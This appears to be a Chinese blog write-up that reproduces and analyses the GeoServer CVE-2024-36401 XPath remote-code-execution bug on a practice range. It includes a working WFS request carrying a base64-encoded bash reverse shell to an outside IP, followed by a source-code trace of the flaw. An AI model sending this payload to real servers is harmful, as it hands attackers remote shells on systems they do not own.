## 1、漏洞详情

GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。

在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。

## 2、环境搭建

[vulhub/geoserver/CVE-2024-36401/README.zh-cn.md at master · vulhub/vulhub · GitHub](https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md)

但是本地docker拉取镜像超时失败

[漏洞复现练习靶场 - 极核::CTF (get-shell.com)](https://hackhub.get-shell.com/games/4/challenges)

## 3、详细分析

先直接打一下poc：

![image-20240711151409614](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240711151409614.png)

反弹shell的payload

```java
POST /geoserver/wfs HTTP/1.1
Host: node.hackhub.get-shell.com:46256
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
Priority: u=1
Content-Type: application/xml
Content-Length: 398

<wfs:GetPropertyValue service='WFS' version='2.0.0'
xmlns:topp='http://www.openplans.org/topp'
xmlns:fes='http://www.opengis.net/fes/2.0'
xmlns:wfs='http://www.opengis.net/wfs/2.0'
valueReference='exec(java.lang.Runtime.getRuntime(),"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuNDguNjMvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}")'>
<wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>
```


根据后期修改的代码，我们可以判断出什么类的方法中有漏洞
[[GEOT-7587系列\]改进了 sikeoka 对 XPath 表达式的处理 ·拉取请求 #4797 ·Geotools/地工工具 ·GitHub上](https://github.com/geotools/geotools/pull/4797/commits/e53e5170ba71521728875a436c80616cfb03c1e8)

```java
rg.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)
org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)
org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)
org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class<T>)
org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)
org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {...}.get(Object, String, Class<T>)
org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)
```

首先根据这个poc，定位到源码中的位置：

一共就一个servlet，

![image-20240711161022904](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240711161022904.png)

Controller是个接口，一般直接继承AbstrcatController，并实现handleRequestInternal方法。handleRequestInternal方法相当于[Struts](https://so.csdn.net/so/search?q=Struts&spm=1001.2101.3001.7020) 1的execute方法。

在这里`org.geoserver.ows`继承了AbstractController类，并实现了handleRequestInternal方法






`GetPropertyValue#run`

![image-20240711164428355](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240711164428355.png)

![image-20240711164723557](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240711164723557.png)
首先通过工厂类获得一个 AttributeExpressionImpl()对象

这里又生成了一个对象，但是把参数进行了一个正则替换
比如，exec(java.lang.Runtime.getRuntime("cal[JYcxk]c")--------->>>exec(java.lang.Runtime.getRuntime("calc")

```java
                PropertyName propertyNameNoIndexes = this.filterFactory.property(request.getValueReference().replaceAll("\\[.*\\]", ""), this.getNamespaceSupport());
```

![image-20240711165316886](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240711165316886.png)
接下来再来看看evaluate的调用，在这里会通过`PropertyAccessors.findPropertyAccessors`获取合适的属性访问器，之后遍历调用其`get`方法，其中就包括了`org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor#get`，官方公告列出来的就有这个

![image-20240711165257427](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240711165257427.png)